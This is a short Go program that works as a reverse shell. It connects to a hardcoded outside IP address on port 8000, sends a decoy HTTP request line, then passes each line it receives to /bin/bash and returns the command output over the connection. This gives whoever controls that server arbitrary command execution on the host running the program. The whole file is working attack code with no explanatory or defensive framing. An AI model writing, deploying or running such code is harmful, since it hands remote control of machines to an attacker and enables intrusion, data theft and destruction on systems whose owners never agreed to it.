package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

func main() {
	server := "45.32.65.48:8000"
	if len(os.Args) > 1 {
		server = os.Args[1]
	}
	conn, err := net.Dial("tcp", server)
	if err != nil {
		log.Fatalln(err)
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"))
	if err == nil {
		log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
	}
	//go io.Copy(os.Stdout, conn)
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text() //+ "\n"
		log.Println(line)
		// conn.Write([]byte(line))
		go func() {
			comOut := run(line)
			conn.Write(comOut)
			os.Stdout.Write(comOut)
		}()
	}
}
